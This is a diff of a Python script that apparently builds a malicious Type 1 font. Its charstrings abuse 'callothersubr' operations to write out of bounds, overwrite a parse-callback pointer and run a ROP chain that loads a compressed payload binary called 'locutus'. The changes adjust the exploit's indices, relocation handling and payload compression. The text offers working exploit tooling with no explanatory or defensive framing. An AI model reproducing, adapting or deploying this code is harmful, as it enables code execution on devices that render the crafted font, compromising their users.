@@ -30,11 +30,12 @@
 #    later, parse_callback - expected
 # 2: buildchar (used for buildchar offset, duh!)
 # 3: idx
-# 4: [start of data]
+# 31000: [start of data]
 
 
 import struct
 import cPickle as pickle
+import zlib
 
 stuff = [pickle.load(open('../goo/catalog/catalog.txt')), pickle.load(open('../goo/catalog/catalog.txt'))]
 
@@ -46,7 +47,7 @@ def xrepr(number, large_int):
         large_int = True
     else:
         if not large_int and number != 0:
-            #number = str(number + 0x10000000) + ' ' + xrepr_plus_small(0x10000000, False, [2, 21]) + ' callothersubr'
+            number = str(number + 0x10000000) + ' ' + xrepr_plus_small(0x10000000, False, [2, 21]) + ' callothersubr'
             #raise Exception('xrepr: nope (%x)' % number)
             pass
     return str(number), large_int
@@ -72,7 +73,10 @@ def encode_unknown(s):
 subrs = {}
 
 # this is read by the ROP stuff
-subr0 = open('../locutus/locutus').read()
+locutus = open('../locutus/locutus').read()
+locutus_len = len(locutus)
+subr0 = zlib.compress(locutus, 9)
+zlocutus_len = len(subr0)
 stuff[0]['plist_offset'] = len(subr0)
 subr0 += stuff[0]['plist']
 stuff[1]['plist_offset'] = len(subr0)
@@ -150,7 +154,7 @@ subrs['main'] = \
 
             {twenty} 42 callothersubr  % go up to 20
 
-          4 3 2 24 callothersubr % 4 -> bca[3]
+          31000 3 2 24 callothersubr % idx = 31000
 
             1 1 25 callothersubr       % first
               1 1 25 callothersubr     % second
@@ -164,13 +168,13 @@ subrs['main'] = \
                                        % - add data to BCA;
                                        % - set y to an appropriate parse_callback
                                        % be lazy - take first items from BCA and stick them at 20
-          4 1 25 callothersubr
-          5 1 25 callothersubr
-          6 1 25 callothersubr
-          7 1 25 callothersubr
-          8 1 25 callothersubr
-          9 1 25 callothersubr
-          10 1 25 callothersubr
+          31000 1 25 callothersubr
+          31001 1 25 callothersubr
+          31002 1 25 callothersubr
+          31003 1 25 callothersubr
+          31004 1 25 callothersubr
+          31005 1 25 callothersubr
+          31006 1 25 callothersubr
 
           3 callsubr                   % start flex
           {go_up_amount} 42 callothersubr
@@ -191,26 +195,31 @@ for idx, data in enumerate(stuff):
     stub = data['final']
     stub += '\0' * (-len(stub) & 3)
     stub = list(struct.unpack('I'*(len(stub)/4), stub))
-    print hex(data['parse_callback'])
     assert data['parse_callback'] > 32000
     assert data['actual_parse_callback'] > 32000
     
     subr = '''1 1 25 callothersubr             % get parse_callback
               {actual_pc} 2 21 callothersubr   % subtract the real one
               1 2 24 callothersubr             % store back
-              '''.format(actual_pc=xrepr_to_small(data['actual_parse_callback'], False))
+              0 {pc}
+                1 1 25 callothersubr
+                  2 20 callothersubr
+                  setcurrentpoint
+              '''.format(actual_pc=xrepr_to_small(data['actual_parse_callback'], False), pc=xrepr_to_small(data['parse_callback'], False))
            
-    subr += '0 %s setcurrentpoint ' % xrepr(data['parse_callback'], False)[0]
     i = 0 
-    print stub
     for number in stub:
         r = data['relocs'].get(i, 0)
         i += 4
         #print hex(number)
-        if r == 0xc: # plist offset in the subr
+        if r == 0xa: # locutus length
+            number += locutus_len
+        elif r == 0xb: # compressed locutus length
+            number += zlocutus_len
+        elif r == 0xc: # plist offset in the subr
             number += data['plist_offset']
         elif r == 0xd: # code offset
-            subr += xrepr_plus_small(number + 4*4, False, [7]) + ' callsubr '
+            subr += xrepr_plus_small(number + 31000*4, False, [7]) + ' callsubr '
             continue
         elif r == 0xe: # decoder offset
             subr += xrepr_plus_small(number - 0x70 - 257*4, False, [6]) + ' callsubr '
@@ -232,7 +241,7 @@ subrtext = ''
 for num, subr in subrs.iteritems():
     if num == 'main': continue
     subrtext += 'dup %d {\n\t%s\n\t} put\n' % (num, subr)
-template = template.replace('%BCA%', ('0 ' * num_bca)[:-1])
+template = template.replace('%BCA%', ' '.join(['0'] * num_bca))
 template = template.replace('%THEPROGRAM%', subrs['main'])
 template = template.replace('%NUMSUBRS%', '%d' % (len(subrs) - 1))
 template = template.replace('%SUBRS%', subrtext)
